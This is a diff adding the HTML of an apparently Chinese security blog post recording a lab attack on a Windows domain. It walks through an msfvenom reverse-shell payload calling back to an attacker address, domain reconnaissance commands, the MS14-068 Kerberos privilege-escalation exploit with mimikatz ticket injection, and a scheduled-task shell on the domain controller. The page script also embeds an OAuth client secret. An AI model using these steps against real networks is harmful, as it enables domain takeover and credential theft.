@@ -1,0 +1,127 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Windows 域渗透"><meta name="keywords" content="windows内网渗透"><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>Windows 域渗透 | J0k3r</title><link rel="shortcut icon" href="/img/fav.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://unpkg.com"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitment/style/default.min.css"><script src="https://cdn.jsdelivr.net/npm/gitment/dist/gitment.browser.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  }
+} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-概念"><span class="toc-number">1.</span> <span class="toc-text">0x01 概念</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#内网"><span class="toc-number">1.1.</span> <span class="toc-text">内网</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#域和域控制器"><span class="toc-number">1.2.</span> <span class="toc-text">域和域控制器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#域"><span class="toc-number">1.2.1.</span> <span class="toc-text">域</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#域控制器"><span class="toc-number">1.2.2.</span> <span class="toc-text">域控制器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-环境搭建"><span class="toc-number">2.</span> <span class="toc-text">0x02 环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#域环境结构"><span class="toc-number">2.1.</span> <span class="toc-text">域环境结构</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04域渗透"><span class="toc-number">3.</span> <span class="toc-text">0x04域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#常用信息收集命令："><span class="toc-number">3.0.1.</span> <span class="toc-text">常用信息收集命令：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MS14-068漏洞复现"><span class="toc-number">3.1.</span> <span class="toc-text">MS14-068漏洞复现</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">28</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">20</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="https://bossgirl.github.io/">八千国家奖学金</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://dxxblog.top/">xx_C1</a><a class="author-info-links__name text-center" href="http://www.cooper111.xyz/">花郎世纪</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://raw.githubusercontent.com/zhuxianjin/images/master/topimg.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/about/">关于</a></span></div><div id="post-info"><div id="post-title">Windows 域渗透</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-08-15</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p><strong>内网渗透真是博大精深</strong>，测试环境准备起来也有点麻烦，遇到很多问题</p>
+<a id="more"></a>
+<h3 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h3><h4 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h4><blockquote>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;局域网（Local Area Network, LAN），又称内网。内网的计算机以NAT（网络地址转换）协议，通过一个公共的网关访问Internet。内网的计算机可向Internet上的其他计算机发送连接请求，但Internet上其他的计算机无法向内网的计算机发送连接请求。</p>
+</blockquote>
+<h4 id="域和域控制器"><a href="#域和域控制器" class="headerlink" title="域和域控制器"></a>域和域控制器</h4><h5 id="域"><a href="#域" class="headerlink" title="域"></a>域</h5><blockquote>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;域（Domain）是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系（即Trust Relation）。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。</p>
+</blockquote>
+<blockquote>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域；每个域都有自己的安全策略，以及它与其他域的安全信任关系。</p>
+</blockquote>
+<blockquote>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;域是一种管理边界，用于一组计算机共享共用的安全数据库，域实际上就是一组服务器和工作站的集合。</p>
+</blockquote>
+<h5 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h5><blockquote>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不过在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为“域控制器（Domain Controller，简写为DC）”。</p>
+</blockquote>
+<blockquote>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，他只能以对等网用户的方式访问Windows共享出来的资源，这样就在一定程度上保护了网络上的资源。</p>
+</blockquote>
+<h3 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h3><p>两个虚拟机，用Windows server 2003 r2做域控，域用户win7</p>
+<p>域控安装简要过程：</p>
+<ul>
+<li><p>win+r运行dcpromo创建新域</p>
+</li>
+<li><p>配置新域的DNS全名和NetBIOS名</p>
+</li>
+<li><p>AD需要DNS服务支持，这里会检测并安装DNS服务</p>
+<ul>
+<li>安装来源发现就是<strong>安装盘*</strong>内的I386文件夹 </li>
+</ul>
+</li>
+<li><p>重启</p>
+</li>
+</ul>
+<p>可以看：<a href="http://support.huawei.com/enterprise/docinforeader!loadDocument1.action?contentId=DOC1000061342&amp;partNo=10062#os_cfg_ads_0029" target="_blank" rel="noopener">搭建AD域环境</a></p>
+<p>创建用户</p>
+<p><img src="https://i.loli.net/2018/08/11/5b6e9aeeaa2c5.png" alt="s9.png"></p>
+<p>win7加入域</p>
+<p><img src="https://i.loli.net/2018/08/11/5b6e9aeeab37b.png" alt="s1.png"></p>
+<p><strong>DNS要设置为域控的IP</strong>，否则会出现网络路径错误</p>
+<p><img src="https://i.loli.net/2018/08/11/5b6e9aee3d693.png" alt="s2.png"></p>
+<p>这是会重启，开机<strong>切换用户</strong>来登陆域</p>
+<p><img src="https://i.loli.net/2018/08/11/5b6e9aeeb0f7e.png" alt="s3.png"></p>
+<p><img src="https://i.loli.net/2018/08/11/5b6e9aee72856.png" alt="s7.png"></p>
+<h4 id="域环境结构"><a href="#域环境结构" class="headerlink" title="域环境结构"></a>域环境结构</h4><p>域：TEST.com</p>
+<p>域控：windows server 2003 r2，ip：10.211.55.26</p>
+<p>域成员：windows 7 x64，ip：10.211.55.19</p>
+<h3 id="0x04域渗透"><a href="#0x04域渗透" class="headerlink" title="0x04域渗透"></a>0x04域渗透</h3><p>假设控制了域网内的一台电脑，要将权限从local admin 提高到Domain admin，访问包括Domain Controller在内的域内中任何一台电脑</p>
+<p>首先得拿到一个shell</p>
+<ul>
+<li>上传Metasploit的反弹马，shell下执行命令</li>
+</ul>
+<p>生成反弹马（这里我win7没有管理员权限，启动不了web服务，遂用exe的）</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.211.201 LPORT=7777 -f exe &gt; ./Desktop/re.exe</code></p>
+<p><img src="https://i.loli.net/2018/08/11/5b6ebd928dda7.png" alt="s10.png"></p>
+<p>msfconsole设置监听并启动</p>
+<p><img src="https://i.loli.net/2018/08/11/5b6ebde419856.png" alt="s11.png"></p>
+<p>输入shell进入控制台，因为win7是中文控制台，会有乱码</p>
+<h5 id="常用信息收集命令："><a href="#常用信息收集命令：" class="headerlink" title="常用信息收集命令："></a>常用信息收集命令：</h5><p><code>echo %PROCESSOR_ARCHITECTURE%</code> //查看系统版本位数</p>
+<p><code>netstat -ano</code> //查看开放的端口</p>
+<p><code>net config Workstation</code> //当前计算机名，全名，用户名，系统版本，工作站域，登陆域</p>
+<p><code>net user /domain b404 pass</code> //修改域内用户密码，需要管理员权限</p>
+<p><code>tasklist /S IP地址 /U 域名\用户名 /P /V</code>    //查看远程计算机进程</p>
+<p><code>tasklist /svc</code>    //查看进程</p>
+<p><code>taskkill /im 进程名称(cmd.exe)</code>    //结束进程</p>
+<p><code>taskkill /pid[进程码]</code>    //<code>-t</code>(结束该进程) <code>-f</code>(强制结束该进程以及所有子进程)</p>
+<p><code>ipconfig /all</code>    //用来查看当前机器的网络环境,判断是工作组,还是域环境.网段是怎么划分的,每个段有多少台机器,DNS服务器IP是多少。</p>
+<p><code>net view</code><br>//用来查看跟本机有关联的机器名.注意,是跟本机有关联的机器,而不是一个段的机器.</p>
+<p><code>net view /domain</code><br>//用来查看当前网络环境存在几个域.</p>
+<p><code>net view /domain:xxxx</code><br>//查看xxx域中存在的跟本机有关联的机器.</p>
+<p><code>net group &quot;domain admins&quot; /domain</code><br>//查看域内管理员.</p>
+<p><code>net user /domain</code><br>//查看域内的用户名.</p>
+<p><code>net group &quot;domain computers&quot; /domain</code><br>//查看域内所有机器名.</p>
+<p><code>net time /domain</code><br>//查看域时间及域服务器的名字</p>
+<p><code>Nslookup -type=SRV _ldap._tcp.</code><br>//查询DNS</p>
+<p><code>netstat</code><br>//查看连接信息.</p>
+<p><code>net group &quot;Domain Controllers&quot; /domain</code><br>//查找域控</p>
+<p><code>nbtstat</code><br>//由IP地址得到机器名</p>
+<p>ping 扫描内网存活主机：</p>
+<p><code>for /l %i in (1,1,255) do @ping 192.168.200.%i -w 1 -n 1 | find /i&quot;ttl&quot;</code></p>
+<p><img src="https://i.loli.net/2018/08/11/5b6ec46303442.png" alt="s13.png"></p>
+<p>查看是否支持PowerShell：<br><code>if defined PSModulePath (echo support powershell) else (echo not support powershell)</code></p>
+<p>比较全的查询命令：<a href="http://b404.xyz/2017/12/30/exploit-domain/" target="_blank" rel="noopener">域渗透的整理</a></p>
+<h4 id="MS14-068漏洞复现"><a href="#MS14-068漏洞复现" class="headerlink" title="MS14-068漏洞复现"></a>MS14-068漏洞复现</h4><p>这个漏洞允许黑客提升任意普通用户权限成为域管理员（Domain Admin）身份。</p>
+<p>貌似主要是Kerberos协议的算法和信息存放以及任意签名的问题，详细原理：<a href="http://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">深入解读MS14-068漏洞</a></p>
+<p>Kerberos协议</p>
+<blockquote>
+<p>Kerberos协议是一种基于第三方可信主机的计算机网络协议，它允许两个实体之间在非安全网络环境（可能被窃听、被重放攻击）下以一种安全的方式证明自己的身份。</p>
+</blockquote>
+<p><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068" target="_blank" rel="noopener">工具</a></p>
+<p>域控地址<br><img src="https://i.loli.net/2018/08/11/5b6ed42422191.png" alt="s15.png"></p>
+<p>用户名与SID<br><img src="https://i.loli.net/2018/08/11/5b6ed42423924.png" alt="s16.png"></p>
+<p>获取TGT并清除缓存票据<br><code>MS14-068.exe -u win7@test.com -p Abcdefg123 -s S-1-5-21-2778320292-2955838337-2508653396-1106 -d xc5ca8.test.com</code></p>
+<p><img src="https://i.loli.net/2018/08/11/5b6ed4ba34466.png" alt="s14.png"></p>
+<p>注入TGT<br><code>mimikatz.exe &quot;kerberos::ptc TGT_win7@test.com.ccache&quot; exit</code></p>
+<p><img src="https://i.loli.net/2018/08/11/5b6ed509efe02.png" alt="s17.png"></p>
+<p><a href="mailto:`TGT_win7@test.com.ccache" target="_blank" rel="noopener">`TGT_win7@test.com.ccache</a>`是个文件，会在本地生成，注意此文件的路径（被坑了半天才发现）</p>
+<p>缓存票据发生变化<br><img src="https://i.loli.net/2018/08/11/5b6ed587618a8.png" alt="s18.png"></p>
+<p>访问域控xc5ca8的资源<br><img src="https://i.loli.net/2018/08/11/5b6ed5a34567f.png" alt="s19.png"></p>
+<p>这时可以传马反弹shell</p>
+<p>copy完后添加计划任务，等待反弹</p>
+<p><img src="https://i.loli.net/2018/08/12/5b6fd98c3c519.png" alt="s20.png"></p>
+<p>成功获取域控的system权限</p>
+<p><img src="https://i.loli.net/2018/08/12/5b6fd98c91a09.png" alt="s21.png"></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">J0k3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yoursite.com/2018/08/15/Windows-domain/">http://yoursite.com/2018/08/15/Windows-domain/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yoursite.com">J0k3r</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/windows内网渗透/">windows内网渗透</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/alipay.jpg"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/wechat.jpg"><div class="post-qr-code__desc">微信打赏</div></div></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/09/02/py-shop/"><i class="fa fa-chevron-left">  </i><span>基于flask/jinja2的简陋的商店系统</span></a></div><div class="next-post pull-right"><a href="/2018/08/12/FJssti/"><span>Flask/Jinja2服务端模版注入</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitment-container"></div><script>var gitment = new Gitment({
+  id: md5(decodeURI(location.pathname)),
+  owner: 'zhuxianjin',
+  repo: 'zhuxianjin.github.io',
+  oauth: {
+    client_id: '10dcae32e6ed34a16cc',
+    client_secret: '7d1ef2b81d50d3f2f24e87ca3251840506c944d2'
+  }
+})
+gitment.render('gitment-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://raw.githubusercontent.com/zhuxianjin/images/master/topimg.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2019 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+}</script></body></html>
